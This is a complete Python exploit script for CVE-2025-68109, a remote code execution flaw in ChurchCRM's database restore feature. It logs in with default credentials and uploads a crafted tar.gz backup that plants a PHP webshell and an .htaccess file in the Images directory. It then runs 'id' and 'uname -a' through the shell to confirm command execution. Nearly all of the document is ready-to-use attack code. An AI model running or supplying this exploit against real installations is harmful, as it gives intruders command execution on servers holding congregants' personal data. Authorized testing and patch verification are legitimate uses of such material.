#!/usr/bin/env python3
"""
CVE-2025-68109 - ChurchCRM Database Restore Remote Code Execution

ChurchCRM versions prior to 6.5.3 do not validate the content or file extension
of uploaded files in the Database Restore functionality. An attacker can upload
a malicious tar.gz backup containing a webshell in the Images directory, which
will be extracted and copied to the web root, enabling RCE.
"""

import requests
import tarfile
import io
import os
import sys
import time
import argparse

class ChurchCRMExploit:
    def __init__(self, target_url, username="Admin", password="changeme"):
        self.target_url = target_url.rstrip("/")
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.webshell_name = "shell.php"
        
    def login(self):
        """Login to ChurchCRM and get session cookie"""
        print("[*] Attempting to login...")
        login_url = f"{self.target_url}/session/begin"
        data = {
            "User": self.username,
            "Password": self.password
        }
        resp = self.session.post(login_url, data=data, allow_redirects=False)
        
        if resp.status_code == 302:
            print("[+] Login successful!")
            return True
        else:
            print(f"[-] Login failed with status code: {resp.status_code}")
            return False
    
    def create_malicious_backup(self):
        """Create a malicious tar.gz backup with webshell in Images directory"""
        print("[*] Creating malicious backup archive...")
        
        webshell_content = b"""<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>"""
        
        htaccess_content = b"""<FilesMatch "\\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""
        
        sql_content = b"""-- ChurchCRM Database Backup
-- This is a minimal SQL file for the restore process
SELECT 1;
"""
        
        tar_buffer = io.BytesIO()
        with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
            webshell_info = tarfile.TarInfo(name=f"Images/{self.webshell_name}")
            webshell_info.size = len(webshell_content)
            tar.addfile(webshell_info, io.BytesIO(webshell_content))
            
            htaccess_info = tarfile.TarInfo(name="Images/.htaccess")
            htaccess_info.size = len(htaccess_content)
            tar.addfile(htaccess_info, io.BytesIO(htaccess_content))
            
            sql_info = tarfile.TarInfo(name="ChurchCRM-Database.sql")
            sql_info.size = len(sql_content)
            tar.addfile(sql_info, io.BytesIO(sql_content))
        
        tar_buffer.seek(0)
        print("[+] Malicious backup created!")
        return tar_buffer.getvalue()
    
    def upload_malicious_backup(self, backup_data):
        """Upload the malicious backup via the restore endpoint"""
        print("[*] Uploading malicious backup...")
        
        restore_url = f"{self.target_url}/api/database/restore"
        files = {
            'restoreFile': ('backup.tar.gz', backup_data, 'application/gzip')
        }
        data = {
            'restorePassword': ''
        }
        
        try:
            resp = self.session.post(restore_url, files=files, data=data, timeout=60)
            print(f"[*] Upload response status: {resp.status_code}")
            if resp.status_code == 200:
                print("[+] Backup uploaded successfully!")
                try:
                    result = resp.json()
                    print(f"[*] Server response: {result}")
                except:
                    pass
                return True
            else:
                print(f"[-] Upload failed: {resp.text[:500]}")
                return False
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return False
    
    def verify_webshell(self):
        """Verify the webshell is accessible and execute a test command"""
        print("[*] Verifying webshell...")
        
        webshell_paths = [
            f"{self.target_url}/Images/{self.webshell_name}",
            f"{self.target_url}/images/{self.webshell_name}",
        ]
        
        for webshell_url in webshell_paths:
            try:
                test_cmd = "id"
                resp = self.session.get(f"{webshell_url}?cmd={test_cmd}", timeout=10)
                if resp.status_code == 200 and ("uid=" in resp.text or "gid=" in resp.text):
                    print(f"[+] Webshell is accessible at: {webshell_url}")
                    print(f"[+] Command output:\n{resp.text}")
                    return webshell_url
            except Exception as e:
                continue
        
        print("[-] Could not verify webshell")
        return None
    
    def execute_command(self, webshell_url, cmd):
        """Execute a command via the webshell"""
        try:
            resp = self.session.get(f"{webshell_url}?cmd={cmd}", timeout=30)
            return resp.text
        except Exception as e:
            return f"Error: {e}"
    
    def exploit(self):
        """Main exploit flow"""
        print("="*60)
        print("CVE-2025-68109 - ChurchCRM Database Restore RCE")
        print("="*60)
        
        if not self.login():
            return False
        
        backup_data = self.create_malicious_backup()
        
        if not self.upload_malicious_backup(backup_data):
            return False
        
        time.sleep(2)
        
        webshell_url = self.verify_webshell()
        if webshell_url:
            print("\n[+] Exploitation successful!")
            print(f"[+] Webshell URL: {webshell_url}")
            
            print("\n[*] Testing RCE with 'uname -a':")
            output = self.execute_command(webshell_url, "uname -a")
            print(output)
            
            return True
        else:
            print("\n[-] Exploitation may have failed")
            return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-68109 ChurchCRM RCE Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-U", "--username", default="Admin", help="Username (default: Admin)")
    parser.add_argument("-P", "--password", default="changeme", help="Password (default: changeme)")
    
    args = parser.parse_args()
    
    exploit = ChurchCRMExploit(args.url, args.username, args.password)
    success = exploit.exploit()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
